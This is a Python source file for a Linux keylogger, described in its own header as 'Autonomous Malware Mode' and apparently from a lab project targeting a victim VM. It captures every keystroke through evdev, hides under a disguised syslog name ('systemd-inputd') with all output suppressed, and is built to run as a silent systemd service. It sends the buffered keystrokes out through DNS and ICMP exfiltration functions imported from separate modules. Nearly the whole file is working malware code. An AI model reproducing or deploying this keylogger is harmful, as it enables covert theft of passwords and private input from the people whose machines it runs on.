"""
keylogger_local.py — Autonomous Malware Mode
=============================================
Designed to run as a silent, persistent systemd service on the victim VM.

Two operating modes selected at startup:
  STEALTH  (default)  — zero output, no terminal artefacts, runs invisibly
  DEBUG               — full verbose output for development and testing

Set mode via environment variable:
  KEYLOGGER_MODE=debug  sudo -E python3 keylogger_local.py   (debug)
  sudo python3 keylogger_local.py                             (stealth, default)

When installed as a systemd service (via setup_victim.sh), STEALTH mode
is always active. The victim sees nothing. No terminal. No output. No trace.
"""

import evdev
from evdev import InputDevice, categorize, ecodes
import threading
import queue
import time
import os
import sys
import logging

# --- EXFILTRATION MODULES ---
from dns_exfil  import send_data_over_dns
from icmp_exfil import send_data_over_icmp


# ============================================================
#   OPERATING MODE
#   STEALTH = autonomous, silent malware behaviour
#   DEBUG   = verbose output for development/testing
# ============================================================
_MODE  = os.environ.get("KEYLOGGER_MODE", "stealth").lower()
STEALTH = (_MODE != "debug")


# ============================================================
#   LOGGING — replaces all print() calls
#   STEALTH: writes silently to /var/log/syslog (no terminal output)
#   DEBUG:   writes to terminal in colour with timestamps
# ============================================================
logger = logging.getLogger("keylogger")
logger.setLevel(logging.DEBUG)

if STEALTH:
    # Silent mode — route to syslog under a disguised process name
    from logging.handlers import SysLogHandler
    _handler = SysLogHandler(address="/dev/log")
    _handler.ident = "systemd-inputd: "   # disguised service name in syslog
    _handler.setLevel(logging.ERROR)      # only log genuine errors to syslog
    logger.addHandler(_handler)
    # Suppress all console output entirely
    logger.addHandler(logging.NullHandler())
else:
    # Debug mode — coloured terminal output
    _handler = logging.StreamHandler(sys.stdout)
    _handler.setLevel(logging.DEBUG)
    _fmt = logging.Formatter("%(asctime)s  %(message)s", datefmt="%H:%M:%S")
    _handler.setFormatter(_fmt)
    logger.addHandler(_handler)

def _log(msg: str):
    """Debug-only print. Silent in STEALTH mode."""
    if not STEALTH:
        logger.debug(msg)

def _err(msg: str):
    """Error log — written to syslog in STEALTH, terminal in DEBUG."""
    logger.error(msg)


# ============================================================
#   SHARED STATE — protected by buffer_lock (Mutex)
# ============================================================
keystroke_buffer    = []
last_keystroke_time = time.time()
buffer_lock         = threading.Lock()
shift_held          = False


# ============================================================
#   TRANSMISSION QUEUE
# ============================================================
packet_queue = queue.Queue()


# ============================================================
#   CONFIGURATION
# ============================================================
MAX_BUFFER_SIZE = 15
IDLE_TIMEOUT    = 5.0
ICMP_ROUTE_MAX  = 4    # <=4 chars → ICMP | >=5 chars → DNS


# ============================================================
#   HELPER — flush buffer (MUST be called while holding lock)
# ============================================================
def _flush_buffer(reason: str):
    global keystroke_buffer
    if not keystroke_buffer:
        return
    payload = "".join(keystroke_buffer)
    _log(f"[FLUSH:{reason}] '{payload}'")
    packet_queue.put(payload)
    keystroke_buffer = []


# ============================================================
#   THREAD 1 — Exfiltration Worker  (Smart Size Routing)
# ============================================================
def exfiltration_worker():
    while True:
        data_chunk = packet_queue.get()
        if data_chunk is None:
            break
        try:
            if len(data_chunk) <= ICMP_ROUTE_MAX:
                _log(f"[ROUTE:ICMP] len={len(data_chunk)} → '{data_chunk}'")
                send_data_over_icmp(data_chunk)
            else:
                _log(f"[ROUTE:DNS ] len={len(data_chunk)} → '{data_chunk}'")
                send_data_over_dns(data_chunk)
        except Exception as e:
            _err(f"Exfiltration error: {e}")
        packet_queue.task_done()


# ============================================================
#   THREAD 2 — Idle Timer Watcher  (Trigger 2)
# ============================================================
def idle_timer_worker():
    global last_keystroke_time
    while True:
        time.sleep(1)
        if time.time() - last_keystroke_time >= IDLE_TIMEOUT:
            with buffer_lock:
                if keystroke_buffer:
                    _flush_buffer("IDLE")
                    last_keystroke_time = time.time()


# ============================================================
#   DEVICE DETECTION
#   In STEALTH mode: retries every 10s until a keyboard appears.
#   Handles the case where the service starts before the USB keyboard
#   is recognised by the kernel (common at boot time).
# ============================================================
def find_keyboard_path() -> str | None:
    try:
        devices = [evdev.InputDevice(p) for p in evdev.list_devices()]
        for dev in devices:
            if "keyboard" in dev.name.lower():
                _log(f"[DEVICE] Found: {dev.name} at {dev.path}")
                return dev.path
        return None
    except Exception as e:
        _err(f"Device search error: {e}")
        return None


def wait_for_keyboard() -> str:
    """
    Blocks until a keyboard device is available.
    In STEALTH mode this is critical — the service may start at boot
    before input devices are fully initialised. Rather than crashing,
    the malware patiently waits and retries silently.
    """
    while True:
        path = find_keyboard_path()
        if path:
            return path
        _log("[DEVICE] No keyboard found — retrying in 10s")
        time.sleep(10)


# ============================================================
#   KEY MAPS (defined once at module level, not per-event)
# ============================================================
SHIFT_MAP = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
    "MINUS": "_",      "EQUAL": "+",
    "LEFTBRACE": "{",  "RIGHTBRACE": "}",
    "BACKSLASH": "|",  "SEMICOLON": ":",
    "APOSTROPHE": '"', "COMMA": "<",
    "DOT": ">",        "SLASH": "?",
    "GRAVE": "~",
}

NOSHIFT_MAP = {
    "MINUS": "-",      "EQUAL": "=",
    "LEFTBRACE": "[",  "RIGHTBRACE": "]",
    "BACKSLASH": "\\", "SEMICOLON": ";",
    "APOSTROPHE": "'", "COMMA": ",",
    "DOT": ".",        "SLASH": "/",
    "GRAVE": "`",
}


# ============================================================
#   MAIN
# ============================================================
def main():
    global last_keystroke_time, shift_held

    # Announce mode (visible only in DEBUG)
    if not STEALTH:
        _log("=" * 55)
        _log("  Keylogger — DEBUG MODE (output visible)")
        _log(f"  Buffer={MAX_BUFFER_SIZE} | Idle={IDLE_TIMEOUT}s | "
             f"Routing: <=4=ICMP | >=5=DNS")
        _log("=" * 55)
    # In STEALTH mode: absolute silence. No banner, no output.

    # Start background threads
    threading.Thread(target=exfiltration_worker, daemon=True).start()
    threading.Thread(target=idle_timer_worker,   daemon=True).start()

    # Wait for keyboard (non-crashing retry loop)
    keyboard_path = wait_for_keyboard()

    # Open the device — grab() makes evdev exclusive in STEALTH mode
    # so keystrokes are captured even if no user session is active
    keyboard = InputDevice(keyboard_path)
    if STEALTH:
        # Exclusive grab prevents keystrokes reaching other processes
        # while the malware is capturing. Uncomment for full stealth:
        # keyboard.grab()
        pass

    _log(f"[START] Capturing on {keyboard_path}")

    try:
        for event in keyboard.read_loop():
            if event.type != ecodes.EV_KEY:
                continue

            key_event = categorize(event)
            raw_key   = key_event.keycode
            if isinstance(raw_key, list):
                raw_key = raw_key[0]
            raw_key = str(raw_key).replace("KEY_", "")

            # Track Shift state across key_down AND key_up
            if "SHIFT" in raw_key:
                if key_event.keystate == key_event.key_down:
                    shift_held = True
                elif key_event.keystate == key_event.key_up:
                    shift_held = False
                continue

            # Only process key_down events for character keys
            if key_event.keystate != key_event.key_down:
                continue

            # Normalise key name
            clean_key = raw_key
            if   clean_key == "SPACE":     clean_key = "[S]"
            elif clean_key == "ENTER":     clean_key = "[E]"
            elif clean_key == "BACKSPACE": clean_key = "<"
            elif clean_key == "TAB":       clean_key = "[T]"
            elif shift_held:
                if len(clean_key) == 1 and clean_key.isalpha():
                    clean_key = clean_key.upper()
                elif clean_key in SHIFT_MAP:
                    clean_key = SHIFT_MAP[clean_key]
            else:
                if len(clean_key) == 1 and clean_key.isalpha():
                    clean_key = clean_key.lower()
                elif clean_key in NOSHIFT_MAP:
                    clean_key = NOSHIFT_MAP[clean_key]

            # Show live buffer in DEBUG mode only
            if not STEALTH:
                with buffer_lock:
                    preview = "".join(keystroke_buffer + [clean_key])
                print(f"  Buffer: {preview!r:<20}", end="\r", flush=True)

            # Critical section — Mutex-protected buffer update
            with buffer_lock:
                last_keystroke_time = time.time()
                keystroke_buffer.append(clean_key)

                # Trigger 3: Word-Boundary
                if clean_key in ("[S]", "[E]"):
                    _flush_buffer("WORD_BOUNDARY")

                # Trigger 1: Fixed-Length Buffer
                elif len(keystroke_buffer) >= MAX_BUFFER_SIZE:
                    _flush_buffer("BUFFER_FULL")

                # Trigger 2 (Idle Timer) handled by idle_timer_worker thread

    except KeyboardInterrupt:
        # Graceful shutdown (DEBUG interactive sessions only)
        _log("\n[STOP] Flushing and exiting...")
        with buffer_lock:
            _flush_buffer("SHUTDOWN")
        packet_queue.put(None)
        try:
            packet_queue.join()
        except KeyboardInterrupt:
            pass
        _log("[STOP] Clean exit.")

    except OSError as e:
        # Device lost (e.g. USB keyboard unplugged)
        # In STEALTH mode, log the error and let systemd restart the service
        _err(f"Device error: {e}")
        sys.exit(1)    # systemd sees exit code 1 → triggers Restart=on-failure

    except Exception as e:
        _err(f"Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
